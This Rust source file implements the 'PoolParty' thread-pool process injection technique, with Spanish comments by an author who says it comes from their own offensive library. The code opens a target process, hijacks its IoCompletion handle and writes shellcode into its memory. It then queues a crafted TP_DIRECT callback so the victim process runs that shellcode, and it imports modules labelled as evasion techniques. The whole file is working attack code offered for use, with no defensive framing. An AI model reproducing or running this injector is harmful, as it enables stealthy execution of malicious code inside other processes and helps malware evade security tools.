use zada_xor::nt::kernel_objects::close::*;
use zada_xor::nt::kernel_objects::duplicate_object::*;
use zada_xor::nt::kernel_objects::query_object::*;
use zada_xor::nt::kernel_objects::set_io_completion::*;
use zada_xor::nt::process::open_process::*;
use zada_xor::nt::process::query_information_process::*;
use zada_xor::nt::types::*;
use zada_xor::techniques::evasion::memory::write_process_mem_rw_rx::*; // estos imports "zada-xor" vienen de mi propia lib que estoy desarrollando, el repo esta en github ;)

// Esta es la impl de mi version de poolparty en rust, dentro de cada funcion podeis ver comentarios (sobretodo en ntsetiocompletion que me ha dado mucho dolor de cabeza) sobre mas info de la impl

pub fn execute_poolparty_shellcode(
    remote_process_pid: u32,
    shellcode: &[u8],
) -> Result<(), String> {
    let remote_process_handle = match open_process(
        remote_process_pid,
        DESIRED_ACCESS::PROCESS_VM_READ
            | DESIRED_ACCESS::PROCESS_VM_WRITE
            | DESIRED_ACCESS::PROCESS_QUERY_INFORMATION
            | DESIRED_ACCESS::PROCESS_VM_OPERATION
            | DESIRED_ACCESS::PROCESS_DUP_HANDLE,
    ) {
        Ok(handl) => {
            #[cfg(debug_assertions)]
            println!(
                "[+] Handle al proceso con pid: {} obtenido exitosamente",
                remote_process_pid
            );
            handl
        }
        Err(e) => return Err(format!("[!] Error open_process: {}", e)),
    };
    let iocp_idx: usize;
    match query_kernel_object_index("IoCompletion") {
        Ok(idx) => {
            #[cfg(debug_assertions)]
            println!("[+] Index de IoCompletion: {}", idx);
            iocp_idx = idx as usize;
        }
        Err(e) => {
            return Err(format!(
                "[!] query_kernel_object_index falló. Motivo: {}",
                e
            ));
        }
    }

    let handle_entry =
        match return_first_handle_maching_kernel_object_idx(remote_process_handle, iocp_idx) {
            Ok(entry) => {
                #[cfg(debug_assertions)]
                println!(
                    "[+] Primer handle idx: {}, encontrado en el proceso.",
                    iocp_idx
                );
                entry
            }
            Err(e) => {
                return Err(format!(
                    "[!] Fallo en return_first_handle_maching_kernel_object_idx: {}",
                    e
                ));
            }
        };

    let current_process_handle: HANDLE = -1isize as HANDLE;

    let mut duplicated_handle: HANDLE = std::ptr::null_mut();

    match nt_duplicate_object(
        remote_process_handle,
        handle_entry.HandleValue,
        current_process_handle,
        &mut duplicated_handle as PHANDLE,
        0,
        0,
        DUPLICATE_SAME_ACCESS,
    ) {
        Ok(_) => {
            #[cfg(debug_assertions)]
            println!(
                "[+] Objeto duplicado con éxito. Nuevo handle: {:?}",
                duplicated_handle
            )
        }
        Err(e) => return Err(format!("Fallo en nt_duplicate_object: {}", e)),
    };

    let _allocated_code_addr = match write_process_mem_rw_rx(remote_process_handle, shellcode) {
        Ok(addr) => {
            #[cfg(debug_assertions)]
            println!(
                "[+] Bytes escritos correctamente en el proceso con handle {:?}.",
                remote_process_handle
            );
            addr
        }
        Err(e) => return Err(format!("[!] write_process_mem_rw_rx falló. Motivo: {}", e)),
    };

    let mut io_complete_task: TP_DIRECT = unsafe { std::mem::zeroed() };
    io_complete_task.callback = _allocated_code_addr as PVOID;

    let _allocated_tpdirect_addr =
        match write_process_mem_rw_rx(remote_process_handle, io_complete_task.as_bytes()) {
            Ok(addr) => {
                #[cfg(debug_assertions)]
                println!(
                    "[+] Bytes escritos correctamente en el proceso con handle {:?}.",
                    remote_process_handle
                );
                addr
            }
            Err(e) => {
                return Err(format!(
                    "[!] write_process_mem_rw_rx con io_complete_task falló. Motivo: {}",
                    e
                ));
            }
        };

    match nt_set_io_completion(
        duplicated_handle,
        _allocated_tpdirect_addr as PVOID,
        std::ptr::null_mut(),
        0,
        std::ptr::null_mut(),
    ) {
        Ok(_) => {
            #[cfg(debug_assertions)]
            println!("[+] Se ha añadido a la cola de iocp el codigo.");
        }
        Err(e) => return Err(format!("[!] nt_set_io_completion falló. Motivo: {}", e)),
    }

    match nt_close(duplicated_handle) {
        Ok(_) => {
            #[cfg(debug_assertions)]
            println!("[+] Handle duplicado cerrado")
        }
        Err(e) => println!("[!] Handle duplicado ERROR al cerrar. Motivo: {}", e),
    }
    match nt_close(remote_process_handle) {
        Ok(_) => {
            #[cfg(debug_assertions)]
            println!(
                "[+] Handle proceso remoto pid: {} cerrado",
                remote_process_pid
            )
        }
        Err(e) => println!("[!] Handle proceso remoto ERROR al cerrar. Motivo: {}", e),
    }

    Ok(())
}
